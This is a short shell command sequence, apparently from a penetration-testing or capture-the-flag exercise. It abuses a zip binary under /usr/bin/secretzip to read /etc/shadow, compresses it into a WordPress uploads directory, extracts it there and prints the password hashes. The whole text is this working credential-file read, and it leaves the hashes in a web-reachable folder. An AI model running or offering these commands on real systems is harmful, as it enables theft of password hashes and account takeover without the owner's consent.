cd /usr/bin/secretzip/  
LFILE=/etc/shadow
TF=/srv/www/wordpress/wp-content/uploads/wpr-addons/forms/shadow.zip
./zip $TF $LFILE
unzip -p $TF > /srv/www/wordpress/wp-content/uploads/wpr-addons/forms/shadow
cat /srv/www/wordpress/wp-content/uploads/wpr-addons/forms/shadow
